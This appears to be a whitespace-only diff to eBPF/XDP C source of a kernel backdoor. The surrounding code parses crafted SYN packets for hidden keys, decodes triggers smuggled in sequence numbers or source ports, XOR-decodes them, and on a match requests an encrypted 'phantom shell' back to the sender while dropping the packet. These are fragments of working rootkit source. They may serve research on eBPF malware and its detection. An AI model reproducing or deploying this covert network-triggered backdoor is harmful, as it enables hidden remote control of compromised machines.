@@ -36,17 +36,17 @@ static __always_inline int execute_key_command(int command_received, __u32 ip, _
             struct backdoor_phantom_shell_data ps_new_data = {0};
             ps_new_data.active = 1;
             ps_new_data.d_ip  = ip;
-            ps_new_data.d_port = port;  
+            ps_new_data.d_port = port;
             if(optional_payload_size == 0){
                 //First phantom init msg
                 __builtin_memcpy(ps_new_data.payload, CC_PROT_PHANTOM_SHELL_INIT, 16);
             }else{
                 __builtin_memcpy(ps_new_data.payload, optional_payload, optional_payload_size);
             }
-            
+
             ring_buffer_send_request_update_phantom_shell(&rb_comm, pid, command_received, ps_new_data);
             break;
-            
+
         default:
             bpf_printk("Command received unknown: %d\n", command_received);
     }
@@ -59,7 +59,7 @@ static __always_inline int manage_backdoor_trigger_v1(char* payload, __u32 paylo
     char section[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
     char section2[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
     char section3[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
-    char key1[CC_TRIGGER_SYN_PACKET_SECTION_LEN]; 
+    char key1[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
     char key2[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
     char key3[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
     char result1[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
@@ -161,7 +161,7 @@ static __always_inline int manage_backdoor_trigger_v1(char* payload, __u32 paylo
         command_received = CC_PROT_COMMAND_PHANTOM_SHELL;
         goto backdoor_finish;
     }
-    
+
 
 backdoor_finish:
     //Found no valid key 3
@@ -178,16 +178,16 @@ backdoor_finish:
     execute_key_command(command_received, ip, port, NULL, 0);
 
     //return XDP_PASS;
-    return XDP_DROP; 
+    return XDP_DROP;
 }
 
 
 /**
  * @brief Operates the V3 backdoor, and opens an encrypted shell if succeeds
  *Returns 1 if it wants to close to discard the ongoing packet.
- * 
- * @param b_data 
- * @return __always_inline 
+ *
+ * @param b_data
+ * @return __always_inline
  */
 static __always_inline int manage_backdoor_trigger_v3_32(struct backdoor_packet_log_data_32 b_data){
     int last_received = b_data.last_packet_modified;
@@ -196,7 +196,7 @@ static __always_inline int manage_backdoor_trigger_v3_32(struct backdoor_packet_
         first_packet = last_received+1;
     }else{
         first_packet = 0;
-    } 
+    }
 
     //The following routine (not just the next check) is necessarily dirty in terms of programming,
     //but the ebpf verifier strongly dislikes MOD operations (check report, screenshot)
@@ -230,7 +230,7 @@ static __always_inline int manage_backdoor_trigger_v3_32(struct backdoor_packet_
             __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SEQ_NUM*p_index), &(seq_num), sizeof(__u32));
         }
     }
-    
+
     /*bpf_printk("Payload before XOR: ");
     for(int ii=0; ii<CC_STREAM_TRIGGER_PAYLOAD_LEN_MODE_SEQ_NUM; ii++){
         bpf_printk("%x", payload[ii]);
@@ -321,7 +321,7 @@ static __always_inline int manage_backdoor_trigger_v3_16(struct backdoor_packet_
         first_packet = last_received+1;
     }else{
         first_packet = 0;
-    } 
+    }
     bpf_printk("BACKDOOR 16: FP:%i, LR:%i\n", first_packet, last_received);
     //The following routine is necessarily dirty in terms of programming,
     //but the ebpf verifier strongly dislikes MOD operations (check report, screenshot)
@@ -382,7 +382,7 @@ static __always_inline int manage_backdoor_trigger_v3_16(struct backdoor_packet_
             __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SRC_PORT*p_index), &(src_port), sizeof(__u16));
         }
     }
-    
+
     bpf_printk("Payload before XOR: ");
     for(int ii=0; ii<CC_STREAM_TRIGGER_PAYLOAD_LEN_MODE_SRC_PORT; ii++){
         bpf_printk("%x", payload[ii]);
